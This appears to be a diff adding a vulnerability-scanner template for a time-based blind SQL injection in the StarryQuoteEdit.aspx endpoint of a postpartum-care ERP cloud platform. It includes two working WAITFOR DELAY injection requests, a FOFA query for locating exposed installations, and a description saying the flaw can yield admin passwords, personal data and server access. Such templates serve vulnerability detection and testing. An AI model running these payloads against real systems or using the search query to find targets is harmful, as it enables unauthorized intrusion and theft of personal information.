@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+        - |
+          GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+id: yueziERP-StarryQuoteEdit_aspx-sql-time
+info:
+    author: Superhero
+    description: |-
+        fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
+        月子会所ERP管理云平台 StarryQuoteEdit.aspx 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+    name: 月子会所ERP管理云平台 StarryQuoteEdit.aspx SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/hwtQiUYb2EjZ9k_7bOS7Pw
+    severity: high
+    tags: []
